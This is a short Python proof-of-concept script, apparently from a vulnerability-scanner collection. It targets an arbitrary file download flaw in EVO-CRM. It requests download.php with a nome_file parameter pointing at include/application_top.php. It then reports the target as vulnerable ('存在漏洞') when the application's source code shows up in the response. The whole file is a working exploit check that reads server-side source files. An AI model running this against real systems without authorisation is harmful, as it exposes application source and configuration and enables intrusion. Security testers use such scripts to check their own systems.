# coding:utf-8
import requests as req
def verify(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
    }
    action = "/download.php?nome_file=include/application_top.php"
    verfy_url = target + action
    resp = req.get(verfy_url, headers=headers, timeout=30, verify=False, allow_redirects=False)
    if resp.status_code == 200 and 'EVO-CRM - Content Relationship Management' in resp.text and "mysql_evocms_fetch_object" in resp.text: #application_top.php存在EVO指纹
        print (target + "，存在漏洞")
        return True
    return False
if __name__ == '__main__':
    verify("https://lpone/")